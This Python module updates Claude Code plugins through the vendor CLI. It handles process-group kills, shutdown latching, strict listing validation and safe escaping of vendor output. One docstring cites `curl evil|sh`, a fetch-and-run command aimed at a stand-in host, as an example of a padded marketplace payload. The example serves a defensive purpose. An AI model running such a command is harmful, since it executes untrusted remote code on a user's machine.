"""Updating the agent's plugins (#124): the runner that spawns the binary, and the update.

Part of the `claude_ipc` quarantine (#368). The vocabulary guard in
`tests/test_plugins.py` keeps this module's words out of every other module.
"""

from __future__ import annotations

import contextlib
import json
import os
import re
import signal
import subprocess
import threading
from collections.abc import Callable, Sequence
from dataclasses import dataclass
from pathlib import Path
from typing import Literal

from hitchrail.projectnames import display_name

# -- plugin updates (#124) ------------------------------------------------------
#
# Checked against Claude Code 2.1.280 on 2026-09-23, `--help` for each
# subcommand plus a real `plugin list --json`, rather than recalled. Every fact
# below is the vendor's to change.
#
# **`-y` is passed, by the operator's decision of 2026-09-23.** It approves
# whatever command a marketplace declares for fetching or installing a plugin,
# unseen, and it is REQUIRED when stdin or stdout is not a terminal, which here
# is always. `--accept-command <sha256>` would approve one shown command
# instead; that means showing it to a person, and it was declined because an
# agent this tool spawns with every permission already sets the ceiling. The
# command that ran is carried out in the outcome when the vendor reports it.
#
# **Only `user` scope is updated.** A `local` or `project` install belongs to a
# project directory the listing does not name: 2.1.280 printed one `local` row
# per project for the same id, at four different versions. Updating them from
# this process's working directory updates the wrong project or none, and
# collapsing them hides installs. `synced` is not a value `-s` accepts, and
# `managed` is an administrator's. Every such row is reported as skipped, and
# so is a `user` row already seen once, so the count covers every row the
# listing returned (#300).

_UPDATABLE_SCOPE = "user"

# One per call. A marketplace refresh is a git fetch per marketplace, and an
# update may download an archive; generous, because the failure they exist for
# is a call that never returns, which would otherwise hold the in flight marker
# until a restart.
_REFRESH_TIMEOUT_S = 300.0
_LISTING_TIMEOUT_S = 60.0
_UPDATE_TIMEOUT_S = 300.0

# The last resort bound on the wait AFTER a kill (#299 round 1 review): the
# child received SIGKILL, which it cannot catch or delay, so this is not
# expected to fire. It exists so `plugin_runner`'s `run` returns close to
# `timeout` under every caller rather than blocking on however long reaping
# an already dead process happens to take.
_REAP_TIMEOUT_S = 2.0

# Allowlists of shape for values that come from the vendor's JSON and go back
# into an argv. An argv element cannot become a second command, but an id that
# starts with `-` would be read as a flag, and anything unexpected means the
# listing is not the one this code understands.
_PLUGIN_ID = re.compile(r"\A[A-Za-z0-9][A-Za-z0-9._@+-]{0,199}\Z")
_SCOPE = re.compile(r"\A[a-z]{1,32}\Z")

# What a failure detail may carry to a phone screen.
_DETAIL_LIMIT = 240

# Put where `_shown` cuts vendor text, so a shortened record reads as one
# rather than as the vendor's whole answer (#305).
_CUT_MARKER = " (truncated) "

# How much of a cut text is its head; the rest of `_DETAIL_LIMIT` is its tail
# (#353). A head alone let padding at the front push the command out of view,
# and an approved command's last characters are the ones that run.
_CUT_HEAD = 160

# #361 round 1 review, M1. What an `abandoned` row's `detail` says, and what
# `PluginsFailed("shutting_down", ...)` says when the runner closed before any
# row was even read: both name the cause honestly rather than reading as an
# ordinary per-plugin failure or an internal defect.
_ABANDONED_DETAIL = "never started: the server was shutting down"
_SHUTTING_DOWN_MESSAGE = "the server was shutting down, so nothing was updated"

PluginResult = Literal["updated", "failed", "skipped", "abandoned"]
PluginFailure = Literal[
    "agent_missing", "marketplace_refresh_failed", "plugins_unreadable", "shutting_down"
]
PluginRunner = Callable[[list[str], float], "subprocess.CompletedProcess[str]"]


@dataclass(frozen=True)
class PluginOutcome:
    """What happened to one row of the listing. Carries no argv: the caller
    learns the vendor's words for nothing but what it shows a person."""

    plugin: str
    scope: str
    result: PluginResult
    detail: str | None = None
    approved_command: str | None = None


class PluginsFailed(Exception):
    """The operation as a whole could not run, and updated nothing further."""

    def __init__(self, code: PluginFailure, message: str) -> None:
        super().__init__(message)
        self.code: PluginFailure = code


class RunnerClosed(Exception):
    """`plugin_runner` refuses to start a child: `RunningChild.kill()` has
    already latched this handle shut (#361 round 1 review, M1). Raised
    before `subprocess.Popen`, so nothing spawns for a `kill()` that already
    ran and is not coming a second time."""


class RunningChild:
    """A thread-safe, one-shot latch on `plugin_runner`'s current child (#361).

    `plugin_runs.py` creates one and hands it to `operation_for`, which
    threads it into `plugin_runner` below; the server's lifespan calls
    `kill()` on shutdown. That indirection exists because the daemon thread
    a server-started run executes on (`plugin_runs.PluginRuns.start`'s
    docstring says why it is daemon, not the executor) never receives
    `KeyboardInterrupt`: Python delivers it only to the main thread, so
    nothing inside `plugin_runner` itself, however it is written, ever sees
    Ctrl-C for that run. The main thread has to reach in and kill the group
    from outside instead, and `plugin_runs.py` is not allowed to know a pid
    is the right thing to signal, or that `os.killpg` is how: that is exactly
    the vendor-adjacent process knowledge this module exists to quarantine.

    **`kill()` closes the handle for good, not just the child it catches
    live** (round 1 review of #361, M1). The first version killed only
    whichever pid was recorded at the exact instant `kill()` ran: a kill
    landing between two `plugin_runner` calls, or between one's `Popen`
    returning and its pid becoming visible here, found `_pid` `None` and did
    nothing, so `update_plugins` carried on into the next plugin as if the
    shutdown had never happened. Measured by the reviewer: a second `claude
    plugin update ... -y` spawned 41ms after the lifespan that had just
    "ended" the run had already exited, and stayed alive. `_closed` is set
    the instant `kill()` runs; `plugin_runner` checks it before every
    `Popen` (`raise_if_closed`), and `_set` checks it for the one race that
    check cannot see on its own: a pid that only becomes visible here after
    `kill()` already ran and found nothing to signal. `_set` kills that pid
    at once instead of recording it, since no second `kill()` call is coming
    to catch it later.
    """

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._pid: int | None = None
        self._closed = False

    def kill(self) -> None:
        """Kill the current child's process group, if one is running now,
        and latch the handle shut for good: every child `plugin_runner`
        would otherwise start after this point is refused before it spawns
        (`raise_if_closed`), and one whose pid was not yet visible here when
        this ran is killed the instant it registers (`_set`) rather than
        left unsignalled the way an unlatched handle left it (#361 M1).

        A no-op on the currently running child when nothing is running now.
        `ProcessLookupError` means the child (or the whole group) is already
        gone, which is not a failure here any more than it is at the timeout
        kill in `plugin_runner`.

        Safe to repeat (#384): the pid is taken and cleared in one locked
        step, so a second call signals nothing. Clearing it in `_set(None)`
        alone was not enough, since a closed handle ignores that call, and a
        second `kill()` then sent SIGKILL to a reaped child's pid, which the
        operating system may since have given to someone else's group.
        """
        with self._lock:
            pid, self._pid = self._pid, None
            self._closed = True
        if pid is not None:
            with contextlib.suppress(ProcessLookupError):
                os.killpg(pid, signal.SIGKILL)

    def raise_if_closed(self) -> None:
        """Refuse a new child once `kill()` has latched this handle shut.

        Called by `plugin_runner` before `Popen`, so a shutdown that landed
        between two calls ends the run there instead of spawning one more
        plugin update that nothing will ever be able to signal again.
        """
        with self._lock:
            closed = self._closed
        if closed:
            raise RunnerClosed

    def _set(self, pid: int | None) -> None:
        """Record `plugin_runner`'s current child, or clear it (`pid=None`)
        once it has been reaped.

        On a closed handle, `None` signals nothing: either the child ran to
        completion on its own, or `kill()` already killed it while it was
        still recorded here. A real pid lands here closed only when `kill()`
        ran after `raise_if_closed` had already let this child's `Popen`
        through but before this call made its pid visible; it is killed
        here at once instead of being recorded, since no second `kill()`
        call is coming to catch it later.
        """
        with self._lock:
            if self._closed:
                orphaned = pid
            else:
                self._pid = pid
                orphaned = None
        if orphaned is not None:
            with contextlib.suppress(ProcessLookupError):
                os.killpg(orphaned, signal.SIGKILL)


def plugin_runner(
    withhold: Sequence[str], *, handle: RunningChild | None = None
) -> PluginRunner:
    """The real runner: an argument list, never a shell, with no terminal.

    `withhold` names environment variables the child must not inherit (#113):
    a marketplace's install command runs with this environment, and `-y` has
    approved it unseen. Which variable holds a secret is the caller's
    vocabulary, not this module's.

    The working directory is the home directory, fixed: the vendor resolves a
    project scope from it, so inheriting it would make the listing depend on
    where the operator's shell was when they typed the command.

    stdin is closed rather than inherited. Under `hitchrail update-plugins` it
    is the operator's terminal, and a child that decided to prompt would wait
    there for an answer nobody knows is being asked for.

    **The child is its own process group leader** (#299). A marketplace's
    install command, approved unseen by `-y`, runs as this child's child, and
    `subprocess.run`'s own timeout handling kills only the pid it started:
    the grandchild survives the run being reported `failed: timed out`. Group
    membership is what lets a timeout end both at once, and `subprocess.run`
    never hands back the `Popen` a caller would need to call `os.killpg` on,
    so the wait and the kill are done here instead of through `run(timeout=)`.

    **The kill covers more than a timeout, and the reap after it is bounded**
    (#299 round 1 review). `subprocess.run` wrapped its own wait in
    `except: process.kill(); raise`, so a `SIGINT` delivered to this process
    while the child ran was also a kill; losing that when `run(timeout=)` was
    dropped meant Ctrl-C on the operator's terminal left `claude plugin update
    ... -y` running orphaned, in its own session, unreachable by the terminal's
    own signal (measured). `except BaseException` restores it **on the thread
    the signal reaches**: true for `hitchrail update-plugins`, which calls
    this from the main thread the way `subprocess.run` did. It is false for a
    run the server started (#361): `plugin_runs.PluginRuns.start` runs the
    operation on a daemon thread, and Python delivers `KeyboardInterrupt` only
    to the main thread, so this `except` never fires there no matter what it
    catches, and the child, no longer in the terminal's process group either,
    outlives the request that leaves. `RunningChild` above is that path's
    answer: the main thread kills the group from outside, when the server's
    own lifespan tears down, instead of waiting for a signal this thread
    cannot receive. And a plain second `communicate()` after the kill assumed
    the pipes would hit EOF as soon as the group died; they do not when a
    grandchild left the group before dying, whether by running `setsid`
    itself or, as here, by being started with its own session, and it still
    holds the inherited stdout or stderr pipe open: EOF then waits for THAT
    process's own exit, not this one's (measured: a grandchild sleeping 8
    seconds made a 0.5 second bound return after 8.0 seconds, and the run
    stayed `running` for every caller until it did). Closing this process's
    ends of the pipes and waiting only for the child actually killed avoids
    depending on who else is still holding them; the bounded `wait` below is
    the last resort if even that child is somehow slow to die after `SIGKILL`.
    """

    def run(argv: list[str], timeout: float) -> subprocess.CompletedProcess[str]:
        if handle is not None:
            # #361 round 1 review, M1. Checked before `Popen`, not only
            # recorded after it: a `kill()` that already ran refuses this
            # child outright, so a shutdown landing between two plugins ends
            # the run here instead of starting one more update nothing can
            # signal a second time.
            handle.raise_if_closed()
        env = {k: v for k, v in os.environ.items() if k not in withhold}
        proc = subprocess.Popen(
            argv,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            # #351. `text=True` decodes strictly by default, and invalid
            # UTF-8 on the vendor's stdout or stderr raised `UnicodeDecodeError`
            # out of `communicate()` itself, before `_call` ever saw a
            # `CompletedProcess` to inspect: neither its `TimeoutExpired` nor
            # its `OSError` arm catches a `ValueError` subclass, so the CLI
            # traced back and the route recorded `internal_error`. Chosen over
            # catching `UnicodeDecodeError` in `_call`, which would need a new
            # failure code, or borrow `plugins_unreadable` for calls that are
            # not the listing. A replaced byte OUTSIDE a JSON string breaks
            # the parse, and `_read_listing` and `_approved_command` already
            # treat that as unreadable. INSIDE a string it parses (#366):
            # the text then carries U+FFFD where the byte was, which is
            # accepted on purpose. The decoder never swallows a following
            # quote, so the structure cannot change; `_PLUGIN_ID` and
            # `_SCOPE` still refuse a replaced id or scope; and a replaced
            # byte in shown text, such as an approved command, shows the
            # loss to the person rather than hiding it.
            errors="replace",
            env=env,
            cwd=Path.home(),
            start_new_session=True,
        )
        # #361. Visible to `RunningChild.kill()` from the moment this process
        # exists to the moment it is reaped, on whichever thread this closure
        # happens to run on: the server's plugin run is on a daemon thread,
        # and the main thread needs `proc.pid` to reach it without knowing
        # anything else about this call. Cleared in `finally` so a handle
        # never outlives the child it named. A `kill()` that raced this exact
        # line, landing after `raise_if_closed` above let this child through
        # but before its pid reached `_set`, is caught by `_set`'s own closed
        # check (#361 M1): it kills this pid at once rather than recording a
        # pid nobody signals again. `communicate()` below has not run yet at
        # that point, so nothing here is "about to be waited on" by a wait
        # already in flight; the SIGKILL from that kill is what makes
        # `communicate()` return once it starts, the same as any other kill
        # of this child.
        if handle is not None:
            handle._set(proc.pid)
        try:
            try:
                stdout, stderr = proc.communicate(timeout=timeout)
            except BaseException:
                # Killed even when `communicate` already reaped the child and
                # the exception landed after (#363), deliberately, unlike
                # `Popen.send_signal`'s `poll()` check (bpo-38630): that
                # guards one pid, and this targets a GROUP. The kernel keeps a
                # pid number allocated while any process still uses it as its
                # group id (`__change_pid` in kernel/pid.c frees it only when
                # no task holds it as pid, group or session), so while a
                # grandchild lingers this kill can only reach our own group,
                # which is the point of it. Only an EMPTY group's number can
                # be reused, by a new group leader, inside the microseconds
                # before this line: accepted, because skipping the kill on a
                # reaped leader would leave a lingering grandchild running.
                # `proc.pid`, not `os.getpgid(proc.pid)`: `start_new_session`
                # above makes this child its own group leader, so its pid IS
                # the group id. Asking the OS for "this pid's group" instead
                # would, the day `start_new_session` is ever dropped, answer
                # with OUR OWN group and turn this into a kill of hitchrail
                # itself. Addressing `proc.pid` directly means that mistake
                # raises ProcessLookupError here instead, which this suppresses
                # the same way as an already exited child: either way there is
                # nothing left here to kill.
                with contextlib.suppress(ProcessLookupError):
                    os.killpg(proc.pid, signal.SIGKILL)
                if proc.stdout is not None:
                    proc.stdout.close()
                if proc.stderr is not None:
                    proc.stderr.close()
                # SIGKILL was sent; if the reap still does not land inside the
                # bound, nothing more this function can do.
                with contextlib.suppress(subprocess.TimeoutExpired):
                    proc.wait(timeout=_REAP_TIMEOUT_S)
                raise
            return subprocess.CompletedProcess(argv, proc.returncode, stdout, stderr)
        finally:
            if handle is not None:
                handle._set(None)

    return run


def update_plugins(
    binary: str, *, run: PluginRunner, report: Callable[[PluginOutcome], None]
) -> list[PluginOutcome]:
    """Refresh the marketplaces, then update every `user` scope plugin once.

    Each outcome goes to `report` as it happens, and the whole list is
    returned. `updated` means the vendor's update exited zero, which is also
    what it does for a plugin that was already current: the vendor does not
    say which, and a status this code cannot observe would be a guess. A
    disabled plugin is updated like any other; enabling is the operator's
    business, staleness is ours. One plugin failing does not stop the rest;
    `PluginsFailed` means the operation itself could not go on, and nothing
    after that point ran.

    **An unreadable listing updates nothing.** Not the rows that parsed, and
    not "0 updated": either would report green on the day the vendor changes
    its JSON, on a machine with twenty plugins that are no longer updated.

    **A closed runner abandons what is left, honestly** (#361 round 1
    review, M1). `run` raises `RunnerClosed` instead of starting a child once
    `RunningChild.kill()` has latched it shut, which is the server's
    shutdown reaching in for whatever plugin update is in flight. The row
    that raise interrupted, and every row still waiting behind it, is
    reported `abandoned` unless its scope or a repeat already skips it: not
    `failed`, since it never ran, and not dropped
    silently, which would read the same as task 142's fixed duplicate-row
    bug, a count short of what the listing actually returned. One
    `RunnerClosed` ends the loop for good; nothing later in `rows` is even
    asked, since the handle that raised it does not reopen.
    """
    try:
        refresh = _call(run, [binary, "plugin", "marketplace", "update"], _REFRESH_TIMEOUT_S)
        if refresh is None or refresh.returncode != 0:
            raise PluginsFailed(
                "marketplace_refresh_failed",
                "the marketplaces could not be refreshed, so no plugin was updated: "
                + (_detail(refresh) if refresh is not None else "timed out"),
            )
        listing = _call(run, [binary, "plugin", "list", "--json"], _LISTING_TIMEOUT_S)
        rows = (
            None
            if listing is None or listing.returncode != 0
            else _read_listing(listing.stdout)
        )
        if rows is None:
            raise PluginsFailed(
                "plugins_unreadable",
                "the installed plugin list could not be understood, so nothing was updated",
            )
    except RunnerClosed as exc:
        # A shutdown landed before any row was even read: there is no listing
        # to mark individual rows `abandoned` against, so the operation as a
        # whole reports why, the same shape as the other two ways this
        # function cannot go on.
        raise PluginsFailed("shutting_down", _SHUTTING_DOWN_MESSAGE) from exc

    outcomes: list[PluginOutcome] = []
    seen: set[str] = set()
    abandoned = False
    for plugin, scope in rows:
        # Scope and repetition first, abandonment after (#370): a row that
        # would never have been updated is `skipped` for its own reason
        # whether or not the server was shutting down, and "never started"
        # would claim a start it was never going to get.
        if scope != _UPDATABLE_SCOPE:
            outcome = PluginOutcome(plugin, scope, "skipped", f"{scope} scope is not updated")
        elif plugin in seen:
            # Dropping this row silently left the count short of what the
            # listing actually returned (#300): the comment above promises
            # every row is covered, and a duplicate is still a row.
            outcome = PluginOutcome(plugin, scope, "skipped", "listed more than once")
        elif abandoned:
            outcome = PluginOutcome(plugin, scope, "abandoned", _ABANDONED_DETAIL)
        else:
            seen.add(plugin)
            try:
                outcome = _update_one(run, binary, plugin)
            except RunnerClosed:
                abandoned = True
                outcome = PluginOutcome(
                    plugin, _UPDATABLE_SCOPE, "abandoned", _ABANDONED_DETAIL
                )
        outcomes.append(outcome)
        report(outcome)
    return outcomes


def _call(
    run: PluginRunner, argv: list[str], timeout: float
) -> subprocess.CompletedProcess[str] | None:
    """`None` for a timeout. A missing or unrunnable binary is the operation
    failing, wherever in the run it happens: reporting each remaining plugin
    `failed` with the same cause would be a list of one fact."""
    try:
        return run(argv, timeout)
    except subprocess.TimeoutExpired:
        return None
    except OSError as exc:
        raise PluginsFailed(
            "agent_missing",
            f"{argv[0]!r} could not be run, so nothing further was updated: {exc}",
        ) from exc


def _update_one(run: PluginRunner, binary: str, plugin: str) -> PluginOutcome:
    done = _call(
        run,
        [binary, "plugin", "update", plugin, "-s", _UPDATABLE_SCOPE, "-y", "--json"],
        _UPDATE_TIMEOUT_S,
    )
    if done is None:
        return PluginOutcome(plugin, _UPDATABLE_SCOPE, "failed", "timed out")
    if done.returncode != 0:
        return PluginOutcome(plugin, _UPDATABLE_SCOPE, "failed", _detail(done))
    return PluginOutcome(
        plugin, _UPDATABLE_SCOPE, "updated", approved_command=_approved_command(done.stdout)
    )


def _read_listing(text: str) -> list[tuple[str, str]] | None:
    """Every row as `(id, scope)`, or `None` if ANY row is not understood."""
    try:
        raw = json.loads(text)
    except (ValueError, RecursionError):
        # Deeply nested input, `"[" * 100000`, blows the parser's own stack
        # rather than raising ValueError (#303): the listing is exactly as
        # unreadable, and reporting it any other way would surface a
        # traceback where a caller expects `plugins_unreadable`.
        return None
    if not isinstance(raw, list):
        return None
    rows = []
    for entry in raw:
        if not isinstance(entry, dict):
            return None
        plugin, scope = entry.get("id"), entry.get("scope")
        if not (isinstance(plugin, str) and _PLUGIN_ID.match(plugin)):
            return None
        if not (isinstance(scope, str) and _SCOPE.match(scope)):
            return None
        rows.append((plugin, scope))
    return rows


def _approved_command(stdout: str) -> str | None:
    """The command `-y` approved, when `--json` reports one. Optional by
    design: the outcome comes from the exit status, never from this."""
    for line in stdout.splitlines():
        try:
            parsed = json.loads(line)
        except (ValueError, RecursionError):
            # Same hazard as `_read_listing` (#303), on a line of the
            # vendor's `--json` update output rather than the listing.
            continue
        shown = parsed.get("shownCommand") if isinstance(parsed, dict) else None
        command = shown.get("command") if isinstance(shown, dict) else None
        if isinstance(command, str) and command:
            return _shown(command)
    return None


def _detail(done: subprocess.CompletedProcess[str]) -> str:
    """The exit status and the last line the vendor said, bounded."""
    lines = [line.strip() for line in (done.stderr or done.stdout or "").splitlines()]
    last = next((line for line in reversed(lines) if line), "")
    text = f"exited {done.returncode}: {last}" if last else f"exited {done.returncode}"
    return _shown(text)


def _shown(text: str) -> str:
    """Vendor text cut to length, then made safe to print, in that order.

    It reaches a terminal under `update-plugins` and a phone screen through
    the route, and the approved command is the only record of what `-y` ran:
    a `\r` and an erase-line sequence in it would print something harmless
    over it, and a `\n` would forge a second outcome line. `display_name` is
    the escaping the project already trusts for names it reports.

    Cutting first bounds the vendor's own text, not what escaping turns it
    into (#305). Escaping turns each control character into six (`\t`
    becomes `\u0009`), so escaping before the cut let a marketplace pad its
    declared command with controls and push the part that mattered past a
    fixed budget six times sooner than an honest command would. Escaping the
    already-cut text can only lengthen it, never split a raw escape
    sequence, because none is left raw to split. `_CUT_MARKER` says a record
    was shortened, so it reads as a cut rather than as the vendor's whole
    answer, and it sits between a head and a tail (#353): 240 spaces and then
    `curl evil|sh` cut to a head alone read `approved: (truncated)` once a
    phone collapsed the spaces.

    A backslash is doubled before the escaping (#353), here and not in
    `display_name`, whose other callers show folder names where a doubled
    backslash would misreport the name. Undoubled, vendor text typing the six
    characters of an escape rendered exactly as the control it spells.
    """
    if len(text) <= _DETAIL_LIMIT:
        return _escaped(text)
    tail = _DETAIL_LIMIT - _CUT_HEAD
    return _escaped(text[:_CUT_HEAD]) + _CUT_MARKER + _escaped(text[-tail:])


def _escaped(text: str) -> str:
    return display_name(text.replace("\\", "\\\\"))
